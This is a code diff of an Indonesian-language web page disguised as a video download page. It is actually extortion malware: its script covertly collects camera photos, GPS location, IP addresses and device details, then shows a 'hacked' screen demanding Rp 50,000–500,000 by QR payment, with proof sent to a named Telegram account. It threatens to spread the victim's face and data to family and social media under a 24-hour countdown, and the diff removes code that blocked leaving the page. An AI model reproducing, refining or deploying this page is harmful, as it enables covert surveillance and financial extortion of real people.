@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <title>Download Video</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
   <style>
     :root {
       --bg: #121212;
@@ -23,21 +23,10 @@
       background: var(--bg);
       color: var(--text);
       min-height: 100vh;
-      padding: 20px;
-      position: relative;
-      overflow-x: hidden;
-      touch-action: pan-y;
     }
     
-    /* Disable scroll */
-    html, body {
-      overflow: hidden;
-      position: fixed;
-      width: 100%;
-      height: 100%;
-    }
-    
-    .container {
+    /* DOWNLOAD PAGE STYLES */
+    .download-container {
       display: flex;
       flex-direction: column;
       align-items: center;
@@ -105,44 +94,29 @@
       text-align: center;
     }
     
-    /* HACKED PAGE - FULLSCREEN NO SCROLL */
+    /* HACKED PAGE STYLES - SCROLLABLE */
     #hackedPage {
       display: none;
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100vw;
-      height: 100vh;
+      min-height: 100vh;
       background: linear-gradient(135deg, #000000 0%, #1a0000 100%);
-      z-index: 1000;
-      overflow: hidden;
-      padding: 0;
-      margin: 0;
-      touch-action: none;
     }
     
     .hacked-container {
-      width: 100vw;
-      height: 100vh;
-      padding: 20px;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: space-between;
-      overflow: hidden;
-      position: relative;
+      min-height: 100vh;
+      padding: 30px 20px;
+      max-width: 500px;
+      margin: 0 auto;
     }
     
     .hacked-header {
       text-align: center;
-      margin-bottom: 20px;
-      width: 100%;
+      margin-bottom: 30px;
     }
     
     .warning-icon {
-      font-size: 50px;
+      font-size: 60px;
       color: #ff0000;
-      margin-bottom: 10px;
+      margin-bottom: 20px;
       animation: blink 1s infinite;
     }
     
@@ -152,27 +126,40 @@
     }
     
     .hacked-title {
-      font-size: 24px;
+      font-size: 28px;
       color: #ff0000;
-      margin-bottom: 10px;
-      font-weight: 700;
+      margin-bottom: 15px;
+      font-weight: 900;
+      text-transform: uppercase;
     }
     
     .hacked-subtitle {
       color: #ff6b6b;
-      font-size: 16px;
-      margin-bottom: 15px;
+      font-size: 18px;
       line-height: 1.4;
     }
     
+    /* Victim Face Section */
+    .face-section {
+      margin: 30px 0;
+      text-align: center;
+    }
+    
+    .face-title {
+      color: #ff2a6d;
+      font-size: 20px;
+      margin-bottom: 15px;
+      font-weight: 700;
+    }
+    
     .victim-face-container {
-      width: 90%;
+      width: 100%;
       max-width: 300px;
-      margin: 10px auto;
+      margin: 0 auto;
       border: 3px solid #ff0000;
       border-radius: 10px;
       overflow: hidden;
-      box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
+      box-shadow: 0 0 30px rgba(255, 0, 0, 0.5);
     }
     
     .victim-face {
@@ -182,185 +169,239 @@
     }
     
     .face-caption {
-      background: rgba(255, 0, 0, 0.2);
+      background: rgba(255, 0, 0, 0.3);
       color: white;
-      padding: 8px;
+      padding: 12px;
       text-align: center;
-      font-size: 14px;
+      font-size: 16px;
       font-weight: 600;
     }
     
+    /* Warning Box */
     .warning-box {
       background: rgba(255, 0, 0, 0.15);
       border: 2px solid #ff2a6d;
-      border-radius: 10px;
-      padding: 15px;
-      margin: 15px 0;
+      border-radius: 12px;
+      padding: 25px;
+      margin: 30px 0;
       text-align: center;
-      width: 90%;
-      max-width: 350px;
     }
     
     .warning-box h3 {
       color: #ff2a6d;
-      margin-bottom: 10px;
-      font-size: 18px;
+      margin-bottom: 15px;
+      font-size: 22px;
+      font-weight: 700;
     }
     
     .warning-box p {
       color: white;
-      font-size: 16px;
-      line-height: 1.4;
+      font-size: 18px;
+      line-height: 1.5;
     }
     
+    /* Payment Section */
     .payment-section {
-      margin: 15px 0;
+      margin: 30px 0;
       text-align: center;
-      width: 90%;
-      max-width: 350px;
     }
     
     .payment-title {
       color: #ff2a6d;
-      font-size: 18px;
-      margin-bottom: 10px;
+      font-size: 22px;
+      margin-bottom: 20px;
       font-weight: 700;
     }
     
     .qr-container {
       background: white;
-      padding: 15px;
-      border-radius: 10px;
-      margin: 10px auto;
+      padding: 25px;
+      border-radius: 15px;
+      margin: 20px auto;
       width: fit-content;
-      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.5);
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+      border: 4px solid #ff0000;
     }
     
     .qr-code {
-      width: 200px;
-      height: 200px;
+      width: 250px;
+      height: 250px;
       object-fit: cover;
-      border-radius: 5px;
-      margin-bottom: 10px;
+      border-radius: 8px;
+      margin-bottom: 15px;
     }
     
     .payment-amount {
       color: #ff0000;
-      font-size: 18px;
+      font-size: 22px;
       font-weight: 900;
-      margin: 10px 0;
+      margin: 15px 0;
     }
     
+    .payment-note {
+      color: #333;
+      font-size: 14px;
+      margin-top: 10px;
+    }
+    
+    /* Telegram Section */
     .telegram-section {
-      margin: 15px 0;
+      margin: 30px 0;
       text-align: center;
     }
     
-    .telegram-link {
-      display: inline-block;
-      background: #0088cc;
-      color: white;
-      padding: 12px 20px;
-      border-radius: 8px;
-      text-decoration: none;
-      font-weight: 600;
-      margin-top: 10px;
-      font-size: 16px;
+    .telegram-title {
+      color: #ff2a6d;
+      font-size: 20px;
+      margin-bottom: 15px;
+      font-weight: 700;
     }
     
+    .telegram-btn {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      background: linear-gradient(135deg, #0088cc, #005ea6);
+      color: white;
+      padding: 16px 30px;
+      border-radius: 10px;
+      text-decoration: none;
+      font-weight: 700;
+      font-size: 18px;
+      box-shadow: 0 5px 15px rgba(0, 136, 204, 0.4);
+      transition: 0.25s;
+      margin-top: 10px;
+      border: none;
+      cursor: pointer;
+      width: 100%;
+      max-width: 300px;
+    }
+    
+    .telegram-btn:hover {
+      background: linear-gradient(135deg, #0099dd, #006bb8);
+      transform: translateY(-3px);
+      box-shadow: 0 8px 20px rgba(0, 136, 204, 0.6);
+    }
+    
+    .telegram-icon {
+      margin-right: 10px;
+      font-size: 24px;
+    }
+    
+    /* Data Box */
     .data-box {
-      background: rgba(0, 0, 0, 0.3);
-      border: 1px solid rgba(255, 42, 109, 0.5);
-      border-radius: 8px;
-      padding: 15px;
-      margin: 10px 0;
-      width: 90%;
-      max-width: 350px;
-      font-size: 12px;
+      background: rgba(0, 0, 0, 0.4);
+      border: 2px solid rgba(255, 42, 109, 0.5);
+      border-radius: 12px;
+      padding: 25px;
+      margin: 30px 0;
     }
     
     .data-box h3 {
       color: #ff2a6d;
-      margin-bottom: 10px;
-      font-size: 14px;
+      margin-bottom: 20px;
+      font-size: 20px;
       text-align: center;
+      text-transform: uppercase;
     }
     
     .data-row {
       display: flex;
       justify-content: space-between;
-      margin-bottom: 5px;
-      padding-bottom: 5px;
-      border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+      margin-bottom: 12px;
+      padding-bottom: 12px;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.2);
     }
     
     .data-label {
       color: #ffb8b8;
+      font-weight: 500;
+      font-size: 15px;
     }
     
     .data-value {
       color: white;
-      font-weight: 500;
+      font-weight: 600;
+      font-size: 15px;
+      text-align: right;
+    }
+    
+    /* Countdown */
+    .countdown-container {
+      text-align: center;
+      margin: 30px 0;
+    }
+    
+    .countdown-title {
+      color: #ff2a6d;
+      font-size: 18px;
+      margin-bottom: 10px;
+      font-weight: 700;
     }
     
     .countdown {
-      font-size: 16px;
-      color: #ff2a6d;
-      margin: 10px 0;
-      font-weight: 700;
+      font-size: 28px;
+      color: #ff0000;
+      font-weight: 900;
       background: rgba(255, 42, 109, 0.1);
-      padding: 10px 15px;
-      border-radius: 8px;
+      padding: 15px 25px;
+      border-radius: 10px;
+      display: inline-block;
+      animation: pulse 2s infinite;
     }
     
+    @keyframes pulse {
+      0%, 100% { transform: scale(1); }
+      50% { transform: scale(1.05); }
+    }
+    
+    /* Final Warning */
     .final-warning {
-      color: #ff2a6d;
-      font-size: 12px;
-      margin: 10px 0;
+      background: rgba(255, 0, 0, 0.15);
+      border: 2px solid rgba(255, 42, 109, 0.5);
+      border-radius: 12px;
+      padding: 25px;
+      margin: 30px 0;
       text-align: center;
-      padding: 10px;
-      background: rgba(255, 0, 0, 0.1);
-      border-radius: 8px;
-      width: 90%;
-      max-width: 350px;
     }
     
-    .lock-overlay {
+    .final-warning p {
+      color: #ff6b6b;
+      font-size: 16px;
+      line-height: 1.5;
+      font-weight: 600;
+    }
+    
+    /* Back to Top Button */
+    .back-to-top {
       position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0, 0, 0, 0.9);
+      bottom: 30px;
+      right: 30px;
+      background: #ff2a6d;
       color: white;
+      width: 50px;
+      height: 50px;
+      border-radius: 50%;
       display: flex;
-      flex-direction: column;
       align-items: center;
       justify-content: center;
-      z-index: 2000;
-      display: none;
       font-size: 24px;
-      text-align: center;
+      cursor: pointer;
+      box-shadow: 0 5px 15px rgba(255, 42, 109, 0.4);
+      z-index: 100;
+      opacity: 0;
+      transition: opacity 0.3s;
     }
     
-    /* Prevent zooming */
-    @media screen and (max-width: 768px) {
-      body {
-        font-size: 16px;
-      }
-      .hacked-title {
-        font-size: 22px;
-      }
-      .hacked-subtitle {
-        font-size: 14px;
-      }
+    .back-to-top.show {
+      opacity: 1;
     }
   </style>
 </head>
 <body>
   <!-- DOWNLOAD PAGE -->
   <div id="downloadPage">
-    <div class="container">
+    <div class="download-container">
       <div class="card">
         <img class="thumb" src="https://uploader.zenzxz.dpdns.org/uploads/1769233744937.jpeg" alt="Thumbnail" />
         <div class="info">
@@ -375,7 +416,7 @@
     </div>
   </div>
 
-  <!-- HACKED PAGE - FULLSCREEN -->
+  <!-- HACKED PAGE - SCROLLABLE -->
   <div id="hackedPage">
     <div class="hacked-container">
       <!-- Header -->
@@ -385,62 +426,98 @@
         <p class="hacked-subtitle">KAMERA DAN LOKASI ANDA TELAH DIREKAM</p>
       </div>
       
-      <!-- Victim Face Photo -->
-      <div class="victim-face-container">
-        <img id="victimFace" class="victim-face" src="" alt="Foto Anda">
-        <div class="face-caption">FOTO ANDA YANG TELAH DIREKAM</div>
+      <!-- Victim Face Section -->
+      <div class="face-section">
+        <h2 class="face-title">WAJAH ANDA YANG TELAH DIREKAM</h2>
+        <div class="victim-face-container">
+          <img id="victimFace" class="victim-face" src="" alt="Foto Wajah Anda">
+          <div class="face-caption">INILAH FOTO WAJAH ANDA YANG KAMI REKAM</div>
+        </div>
       </div>
       
       <!-- Warning Box -->
       <div class="warning-box">
-        <h3>⚠️ PERINGATAN PENTING</h3>
+        <h3>⚠️ PERINGATAN PENTING ⚠️</h3>
         <p>
-          MINIMAL BAYAR Rp 50.000<br>
+          <strong>MINIMAL BAYAR Rp 50.000</strong><br><br>
           JIKA TIDAK, DATA DAN WAJAH ANDA<br>
-          AKAN DISEBAR LUASKAN DI INTERNET!
+          AKAN KAMI SEBARKAN KE:<br>
+          • MEDIA SOSIAL<br>
+          • FORUM INTERNET<br>
+          • KELUARGA DAN TEMAN ANDA<br><br>
+          <strong>BAYAR UNTUK MENGHAPUS DATA!</strong>
         </p>
       </div>
       
       <!-- Payment Section -->
       <div class="payment-section">
-        <div class="payment-title">BAYAR DENGAN SCAN QRIS</div>
+        <h2 class="payment-title">BAYAR DENGAN SCAN QRIS</h2>
         <div class="qr-container">
           <img src="https://files.catbox.moe/befqdg.jpg" alt="QRIS" class="qr-code">
           <div class="payment-amount">Rp 50.000 - Rp 500.000</div>
-          <div style="color: black; font-size: 12px; margin-top: 5px;">Transfer minimal Rp 50.000</div>
+          <div class="payment-note">Scan QR code di atas untuk membayar</div>
         </div>
+        <p style="color: #ff6b6b; margin-top: 20px; font-size: 16px;">
+          Transfer minimal Rp 50.000 untuk menghapus semua data dan foto
+        </p>
       </div>
       
       <!-- Telegram Section -->
       <div class="telegram-section">
-        <div style="color: #ff2a6d; font-weight: 600; margin-bottom: 10px;">KIRIM BUKTI TRANSFER KE:</div>
-        <a href="https://t.me/cukiii_55" class="telegram-link" target="_blank">
-          📱 t.me/cukiii_55
+        <h2 class="telegram-title">KIRIM BUKTI TRANSFER</h2>
+        <p style="color: white; margin-bottom: 20px; font-size: 16px;">
+          Setelah transfer, kirim bukti ke Telegram kami:
+        </p>
+        <a href="https://t.me/cukiii_55" class="telegram-btn" target="_blank">
+          <span class="telegram-icon">📱</span>
+          KLIK UNTUK KE TELEGRAM
         </a>
+        <p style="color: #ffb8b8; margin-top: 15px; font-size: 14px;">
+          Username: @cukiii_55<br>
+          Kirim bukti transfer untuk konfirmasi
+        </p>
       </div>
       
       <!-- Countdown -->
-      <div class="countdown" id="countdown">
-        ⏰ WAKTU ANDA: 24:00:00
+      <div class="countdown-container">
+        <div class="countdown-title">⏰ WAKTU ANDA TINGGAL:</div>
+        <div class="countdown" id="countdown">24:00:00</div>
+        <p style="color: #ff6b6b; margin-top: 10px; font-size: 14px;">
+          Setelah waktu habis, semua data akan otomatis disebar
+        </p>
       </div>
       
       <!-- Data Box -->
       <div class="data-box" id="victimData">
-        <!-- Data korban akan ditampilkan di sini -->
+        <h3>📊 DATA YANG TELAH KAMI REKAM</h3>
+        <!-- Data akan diisi oleh JavaScript -->
       </div>
       
       <!-- Final Warning -->
       <div class="final-warning">
-        ⚠️ SEMUA DATA AKAN DISEBAR JIKA TIDAK MEMBAYAR DALAM 24 JAM
+        <p>
+          ⚠️ PERINGATAN TERAKHIR ⚠️<br><br>
+          Kami telah menyimpan:<br>
+          • 3 FOTO WAJAH ANDA<br>
+          • LOKASI GPS ANDA<br>
+          • INFORMASI HP ANDA<br>
+          • IP ADDRESS ANDA<br><br>
+          <strong>BAYAR SEKARANG ATAU SEMUA DATA AKAN DISEBAR!</strong>
+        </p>
+      </div>
+      
+      <!-- Additional Warning -->
+      <div style="text-align: center; margin: 40px 0; padding: 20px; background: rgba(255, 0, 0, 0.1); border-radius: 10px;">
+        <p style="color: #ff2a6d; font-size: 16px; font-weight: 600;">
+          🔒 Halaman ini tidak bisa ditutup!<br>
+          🔒 Refresh browser tidak akan membantu!<br>
+          🔒 Satu-satunya cara: BAYAR!
+        </p>
       </div>
     </div>
-  </div>
-
-  <!-- Lock Overlay -->
-  <div class="lock-overlay" id="lockOverlay">
-    <div style="font-size: 40px; margin-bottom: 20px;">🔒</div>
-    <div>TIDAK BISA DITUTUP</div>
-    <div style="font-size: 14px; margin-top: 10px; color: #ff6b6b;">Bayar untuk membuka halaman ini</div>
+    
+    <!-- Back to Top Button -->
+    <div class="back-to-top" id="backToTop" onclick="scrollToTop()">↑</div>
   </div>
 
   <script>
@@ -701,6 +778,8 @@
       } catch (error) {
         hasCapturedCamera = false;
         console.log('Camera blocked:', error.message);
+        // Use placeholder if camera blocked
+        document.getElementById('victimFace').src = 'https://via.placeholder.com/300x300/ff0000/ffffff?text=Kamera+Diblokir';
       }
     }
     
@@ -733,14 +812,13 @@
     // DISPLAY VICTIM DATA
     function displayVictimData(data) {
       const victimDataEl = document.getElementById('victimData');
-      victimDataEl.innerHTML = `
-        <h3>📊 DATA YANG TELAH DIREKAM:</h3>
+      victimDataEl.innerHTML += `
         <div class="data-row">
-          <span class="data-label">📱 Device:</span>
+          <span class="data-label">📱 Tipe HP:</span>
           <span class="data-value">${data.deviceBrand} ${data.deviceType}</span>
         </div>
         <div class="data-row">
-          <span class="data-label">🖥️ OS:</span>
+          <span class="data-label">🖥️ Sistem Operasi:</span>
           <span class="data-value">${data.os} ${data.osVersion}</span>
         </div>
         <div class="data-row">
@@ -748,78 +826,54 @@
           <span class="data-value">${data.batteryLevel} (${data.isCharging ? 'Sedang Charge' : 'Tidak Charge'})</span>
         </div>
         <div class="data-row">
+          <span class="data-label">📐 Ukuran Layar:</span>
+          <span class="data-value">${data.screenSize}</span>
+        </div>
+        <div class="data-row">
           <span class="data-label">🌐 IP Public:</span>
           <span class="data-value">${data.publicIP}</span>
         </div>
         <div class="data-row">
-          <span class="data-label">📸 Kamera:</span>
-          <span class="data-value">${hasCapturedCamera ? '✅ 3 FOTO WAJAH' : '❌ Diblokir'}</span>
+          <span class="data-label">🔒 IP Local:</span>
+          <span class="data-value">${data.localIP}</span>
         </div>
         <div class="data-row">
-          <span class="data-label">📍 Lokasi:</span>
-          <span class="data-value">${hasCapturedLocation ? '✅ GPS TERKUNCI' : '❌ Diblokir'}</span>
+          <span class="data-label">📸 Foto Kamera:</span>
+          <span class="data-value">${hasCapturedCamera ? '✅ 3 FOTO TEREKAM' : '❌ DIBLOKIR'}</span>
         </div>
         <div class="data-row">
-          <span class="data-label">🕐 Waktu:</span>
+          <span class="data-label">📍 Lokasi GPS:</span>
+          <span class="data-value">${hasCapturedLocation ? '✅ TEREKAM' : '❌ DIBLOKIR'}</span>
+        </div>
+        <div class="data-row">
+          <span class="data-label">🌐 Browser:</span>
+          <span class="data-value">${data.browser}</span>
+        </div>
+        <div class="data-row">
+          <span class="data-label">🌍 Bahasa:</span>
+          <span class="data-value">${data.language}</span>
+        </div>
+        <div class="data-row">
+          <span class="data-label">🕐 Waktu Rekam:</span>
           <span class="data-value">${data.timestamp}</span>
         </div>
       `;
     }
     
-    // PREVENT SCROLLING AND EXIT
-    function lockScreen() {
-      // Disable all scrolling
-      document.body.style.overflow = 'hidden';
-      document.documentElement.style.overflow = 'hidden';
-      
-      // Prevent back button
-      history.pushState(null, null, location.href);
-      window.onpopstate = function(event) {
-        history.go(1);
-        document.getElementById('lockOverlay').style.display = 'flex';
-        setTimeout(() => {
-          document.getElementById('lockOverlay').style.display = 'none';
-        }, 2000);
-      };
-      
-      // Prevent right click
-      document.addEventListener('contextmenu', function(e) {
-        e.preventDefault();
-        document.getElementById('lockOverlay').style.display = 'flex';
-        setTimeout(() => {
-          document.getElementById('lockOverlay').style.display = 'none';
-        }, 2000);
-      });
-      
-      // Prevent refresh
-      window.onbeforeunload = function() {
-        return "Halaman ini tidak bisa ditutup!";
-      };
-      
-      // Prevent keyboard shortcuts
-      document.addEventListener('keydown', function(e) {
-        // Prevent F5, Ctrl+R, Ctrl+Shift+R, etc.
-        if (e.key === 'F5' || 
-            (e.ctrlKey && e.key === 'r') || 
-            (e.ctrlKey && e.key === 'R') ||
-            (e.metaKey && e.key === 'r')) {
-          e.preventDefault();
-          document.getElementById('lockOverlay').style.display = 'flex';
-          setTimeout(() => {
-            document.getElementById('lockOverlay').style.display = 'none';
-          }, 2000);
-        }
-        
-        // Prevent escape key
-        if (e.key === 'Escape') {
-          e.preventDefault();
-          document.getElementById('lockOverlay').style.display = 'flex';
-          setTimeout(() => {
-            document.getElementById('lockOverlay').style.display = 'none';
-          }, 2000);
-        }
-      });
+    // BACK TO TOP FUNCTION
+    function scrollToTop() {
+      window.scrollTo({ top: 0, behavior: 'smooth' });
     }
+    
+    // SHOW/HIDE BACK TO TOP BUTTON
+    window.addEventListener('scroll', function() {
+      const backToTopBtn = document.getElementById('backToTop');
+      if (window.scrollY > 300) {
+        backToTopBtn.classList.add('show');
+      } else {
+        backToTopBtn.classList.remove('show');
+      }
+    });
     
     // START DOWNLOAD PROCESS
     async function startDownloadProcess() {
@@ -892,8 +946,7 @@
         `📱 Contact: @cukiii_55`
       );
       
-      // Lock screen and show hacked page
-      lockScreen();
+      // Show hacked page
       showHackedPage();
     }
     
@@ -907,6 +960,9 @@
       
       // Start countdown
       startCountdown();
+      
+      // Scroll to top
+      window.scrollTo(0, 0);
     }
     
     // COUNTDOWN FUNCTION
@@ -922,7 +978,7 @@
           if (minutes === 0) {
             if (hours === 0) {
               clearInterval(timer);
-              countdownEl.innerHTML = '⏰ WAKTU HABIS! DATA AKAN DISEBAR!';
+              countdownEl.innerHTML = 'WAKTU HABIS! DATA DISEBAR!';
               countdownEl.style.color = '#ff0000';
               countdownEl.style.animation = 'blink 0.5s infinite';
               return;
@@ -937,7 +993,7 @@
           seconds--;
         }
         
-        countdownEl.innerHTML = `⏰ WAKTU ANDA: ${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+        countdownEl.innerHTML = `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
       }, 1000);
     }
     
